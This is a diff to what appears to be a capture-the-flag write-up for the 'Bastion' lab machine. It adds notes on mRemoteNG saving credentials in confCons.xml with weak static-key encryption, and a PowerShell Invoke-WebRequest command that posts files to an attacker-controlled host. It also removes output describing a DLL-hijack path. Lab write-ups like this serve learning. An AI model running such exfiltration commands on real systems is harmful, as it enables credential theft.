@@ -39,11 +39,15 @@ This lets us login via `ssh` and grab the `user.txt`!
 
 Found a non-standard tool called `mRemoteNG`
 
+With some research I've found out that `mRemote` saves files in an incsure way within the `confCons.xml` file.
+
+
+Running this command below to extract the file
 
 ```
-ModifiablePath    : C:\Users\L4mpje\AppData\Local\Microsoft\WindowsApps
-IdentityReference : BASTION\L4mpje
-Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
-%PATH%            : C:\Users\L4mpje\AppData\Local\Microsoft\WindowsApps
-AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\L4mpje\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'
+powershell Invoke-WebRequest -Uri http://10.10.14.55:8080 -Method Post -Infile *
 ```
+
+Reading the link [here](http://hackersvanguard.com/mremoteng-insecure-password-storage/) it states that the passwords are only encrypted using a static string!
+
+We can write a quick python script to fuck shit up. 
